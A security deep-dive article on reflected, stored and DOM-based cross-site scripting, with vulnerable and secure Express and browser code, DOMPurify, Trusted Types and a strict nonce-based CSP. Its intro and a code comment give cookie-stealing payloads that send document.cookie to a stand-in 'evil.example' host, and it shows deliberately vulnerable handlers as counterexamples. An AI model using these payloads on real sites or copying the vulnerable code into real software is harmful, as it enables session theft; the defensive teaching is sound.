---
title: "Cross-Site Scripting (XSS): Reflected, Stored, and DOM-based Injection Controls"
description: "How Reflected, Stored, and DOM-based XSS actually differ in data flow, with vulnerable-vs-secure code for each sink, DOMPurify and Trusted Types remediation, and a strict nonce-based Content Security Policy as defense-in-depth."
categorySlug: "appsec-threats"
articleType: "DEEP_DIVE"
tags:
  - "xss"
  - "cross-site-scripting"
  - "content-security-policy"
  - "dompurify"
  - "trusted-types"
  - "dom-based-xss"
  - "input-sanitization"
  - "owasp"
---

# Cross-Site Scripting (XSS): Reflected, Stored, and DOM-based Injection Controls

## The Problem: Script Execution in the Client Trust Boundary

A support team adds a "Reply to ticket" feature to their helpdesk app. A customer submits a reply containing `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`. The reply is saved to the database exactly as typed, and every agent who later opens that ticket in their browser silently sends their session cookie to the attacker's server — no click required, no obvious warning sign in the UI. This is Stored XSS, and it is one of three distinct data-flow patterns that all fall under the "Cross-Site Scripting" umbrella.

Cross-Site Scripting (XSS) is a vulnerability class where an application takes untrusted, unvalidated input and outputs it back into a browser context without proper encoding or sanitization. This allows attackers to inject malicious HTML or JavaScript into the victim's browser session.

Once executed, injected script bypasses the Same-Origin Policy (SOP), granting the attacker access to the browser session: cookies (`document.cookie`, if not marked `HttpOnly`), keystrokes, local storage tokens, and the ability to issue authenticated API calls as the victim. Securing modern client-side architectures requires understanding the specific data flow of each XSS variant — Reflected, Stored, and DOM-based — and layering containment on top of sanitization, because sanitization bugs happen and a strict Content Security Policy is what keeps a missed sanitization gap from becoming a full account takeover.

---

## Architectural View: The Data Flow of Stored, Reflected, and DOM-based XSS

XSS manifests differently depending on where the payload is parsed and which trust boundary it crosses.

```
[ Reflected XSS ]
Attacker Payload --> HTTP Request (URL/Param) --> Server Echoes Directly --> Browser Execution

[ Stored XSS ]
Attacker Payload --> HTTP Request --> Persisted in Database --> Victim Requests Page --> Rendered to Victim's Browser

[ DOM-based XSS ]
Attacker Payload --> Fragment Identifier/hash (#payload) --> Client JS Reads Source --> Sink (innerHTML) --> Browser Execution
                       (never touches the server)
```

- **Reflected XSS** — the payload rides in the request (query string, form field, header) and the server echoes it straight back into the response HTML with no encoding. Classic example: a search page that renders `<p>No results for: ${req.query.q}</p>` verbatim. The attacker must trick the victim into clicking a crafted URL.
- **Stored XSS** — the payload is persisted (database row, comment, forum post, uploaded profile field) and executes for every user who later views the page that renders it. No per-victim link is needed once the payload is stored — this is why it is generally considered more dangerous than Reflected XSS.
- **DOM-based XSS** — the entire vulnerable flow lives in client-side JavaScript. A *source* the attacker controls (`location.hash`, `location.search`, `document.referrer`, `postMessage` data) flows into a *sink* that executes markup (`innerHTML`, `document.write`, `eval`) without the payload ever being sent to or reflected by the server. Server-side logging and WAF rules that only inspect requests/responses miss this class entirely.

---

## Reflected and Stored XSS: The Server-Side Half

Both variants share the same root cause on the server: untrusted input reaches an HTML-rendering sink without context-aware encoding.

```javascript
const express = require('express');
const escapeHtml = require('escape-html');
const app = express();

// VULNERABLE: reflected XSS via unescaped query parameter
app.get('/search-unsafe', (req, res) => {
    const q = req.query.q || '';
    // req.query.q is rendered directly into the HTML body
    res.send(`<p>No results found for: ${q}</p>`);
});
// Attack: GET /search-unsafe?q=<script>fetch('https://evil.example/steal?c='+document.cookie)</script>

// SECURE: context-aware HTML entity encoding before rendering
app.get('/search-safe', (req, res) => {
    const q = escapeHtml(req.query.q || '');
    res.send(`<p>No results found for: ${q}</p>`);
});

// VULNERABLE: stored XSS — comment body saved and rendered without encoding
app.post('/comments-unsafe', async (req, res) => {
    await db.query('INSERT INTO comments (body) VALUES ($1)', [req.body.text]);
    res.redirect('/comments');
});
app.get('/comments', async (req, res) => {
    const rows = await db.query('SELECT body FROM comments ORDER BY id DESC');
    const html = rows.map(r => `<li>${r.body}</li>`).join('');   // raw interpolation — vulnerable
    res.send(`<ul>${html}</ul>`);
});

// SECURE: encode at render time, regardless of how the data was stored
app.get('/comments-safe', async (req, res) => {
    const rows = await db.query('SELECT body FROM comments ORDER BY id DESC');
    const html = rows.map(r => `<li>${escapeHtml(r.body)}</li>`).join('');
    res.send(`<ul>${html}</ul>`);
});
```

Two rules fall out of this:
1. **Encode at the point of output, not the point of input.** Sanitizing on the way into the database doesn't help if the same data is later reused in a JSON API response, an email template, or a mobile app — each output context needs its own encoding rules (HTML body, HTML attribute, JS string, URL).
2. **Never assume "it's already in the database, so it must be safe."** Stored XSS payloads pass through the database completely unchanged — a database is not a sanitization boundary.

---

## DOM-based XSS: Vulnerable and Secure Client-Side Rendering

DOM-based XSS requires no server round-trip at all — the vulnerable source and sink are both in the browser. Below is an unsafe DOM manipulation script, followed by its secure, sanitized counterpart using DOMPurify and the W3C Trusted Types API.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Prevention Demonstration</title>
    <!-- Include DOMPurify via a cryptographically validated subresource integrity (SRI) CDN path -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"
            integrity="sha512-YdfMh60U6KpHXv8g6LhVvpxoSTvIAnzXz3p9LgOQG1V19gZgY5y3f6R69yO4+eM/T8z2h7Zl/C1D8bQ=="
            crossorigin="anonymous"
            referrerpolicy="no-referrer"></script>
</head>
<body>
    <div id="output-unsafe"></div>
    <div id="output-secure"></div>

    <script>
        // Source: attacker-controlled fragment, e.g. index.html#<img src=x onerror=alert(1)>
        const untrustedInput = decodeURIComponent(window.location.hash.substring(1));

        // --- VULNERABLE APPROACH ---
        // Sinks like innerHTML directly execute any script or event handler passed into them
        // document.getElementById('output-unsafe').innerHTML = untrustedInput; // DO NOT DO THIS

        // --- SECURE APPROACH 1: Strict, context-aware sanitization ---
        const cleanHTML = DOMPurify.sanitize(untrustedInput, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
            ALLOWED_ATTR: ['href', 'title']
        });
        document.getElementById('output-secure').innerHTML = cleanHTML;

        // --- SECURE APPROACH 2: Enforce Trusted Types (modern Chromium-based browsers) ---
        // Once a Trusted Types policy is required, dangerous sinks throw on a raw string —
        // only a value produced by a vetted policy can be assigned.
        if (window.trustedTypes && window.trustedTypes.createPolicy) {
            const escapeHTMLPolicy = window.trustedTypes.createPolicy('myEscapePolicy', {
                createHTML: (string) => DOMPurify.sanitize(string)
            });

            document.getElementById('output-secure').innerHTML =
                escapeHTMLPolicy.createHTML(untrustedInput);
        }
    </script>
</body>
</html>
```

Common DOM-based sources and sinks to audit for in any client-side code review:

| Sources (attacker-influenced) | Sinks (execute markup/code) |
|---|---|
| `location.hash`, `location.search`, `location.href` | `innerHTML`, `outerHTML`, `insertAdjacentHTML` |
| `document.referrer` | `document.write`, `document.writeln` |
| `window.name` | `eval`, `Function(...)`, `setTimeout(string, ...)` |
| `postMessage` event data | `element.setAttribute('href'/'src', ...)` with `javascript:` URLs |
| URL fragments read by client-side routers | Angular `bypassSecurityTrust*`, React `dangerouslySetInnerHTML` |

---

## The Ultimate Containment: Strict Content Security Policy (CSP)

Even with careful sanitization, a multi-layered defense requires containing XSS with a non-permissive Content Security Policy. A modern, strict CSP relies on cryptographic nonces (a "number used once") rather than dynamic domain allow-lists, which are routinely bypassed via JSONP endpoints or open redirects hosted on an otherwise-trusted domain.

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

app.get('/dashboard', (req, res) => {
    // Generate a cryptographically secure, high-entropy, unique nonce per request
    const nonce = crypto.randomBytes(16).toString('base64');

    res.setHeader('Content-Security-Policy',
        `default-src 'none'; ` +
        `script-src 'nonce-${nonce}' 'strict-dynamic' https:; ` +
        `style-src 'self' 'unsafe-inline'; ` +
        `img-src 'self' data:; ` +
        `connect-src 'self' https://api.yourdomain.com; ` +
        `frame-ancestors 'none'; ` +
        `base-uri 'none'; ` +
        `form-action 'self';`
    );

    // Only <script> tags carrying the matching nonce are permitted to execute
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure Console</title>
        </head>
        <body>
            <h1>Administrative Console</h1>
            <script nonce="${nonce}">
                console.log("Safe script execution under CSP enforcement.");
            </script>
        </body>
        </html>
    `);
});
```

Why this specific policy shape matters:
- `default-src 'none'` denies everything by default; every capability must be explicitly allowed.
- `script-src 'nonce-${nonce}' 'strict-dynamic' https:` means only scripts carrying today's nonce execute, and `strict-dynamic` lets a nonce-approved script load further scripts it trusts, without needing to enumerate every third-party host.
- `object-src` is implicitly denied by `default-src 'none'`, closing off legacy plugin-based injection (Flash/Java applets).
- `base-uri 'none'` stops an attacker-injected `<base href>` tag from silently rewriting all relative URLs on the page.
- A **new nonce per request** is essential — a static or reused nonce can be discovered and replayed, defeating the entire protection.

---

## Defensive Countermeasures Checklist

1. **Never trust sinks.** Avoid writing raw strings to `innerHTML`, `document.write`, or `eval()`. Prefer safe primitives like `textContent`, `element.setAttribute` (with an allow-list for `href`/`src`), and framework-native binding (React JSX, Angular interpolation) which encode by default.
2. **Encode per output context, at render time.** HTML body, HTML attribute, JavaScript string, and URL contexts each require different encoding — pick a library (e.g. OWASP's `ESAPI` or per-language equivalents) that provides all four rather than hand-rolling encoding.
3. **Sanitize any HTML you must render as HTML.** Use an actively maintained library like DOMPurify with an explicit `ALLOWED_TAGS`/`ALLOWED_ATTR` allow-list — never a deny-list of "bad" tags, which is trivially bypassed.
4. **Enforce Trusted Types** on Chromium-based targets to make dangerous sinks throw at runtime unless the value came from a vetted policy — this turns a missed sanitization call into a loud browser-console error instead of a silent exploit.
5. **Deploy a strict, nonce-based CSP** as defense-in-depth so that even a successful injection has nowhere to execute from.
6. **Set the `HttpOnly` flag on session cookies** so `document.cookie` cannot read them from injected JavaScript, and pair it with `Secure` and `SameSite=Lax`/`Strict` to blunt session-theft and CSRF-adjacent attacks if an XSS bypass is ever found.
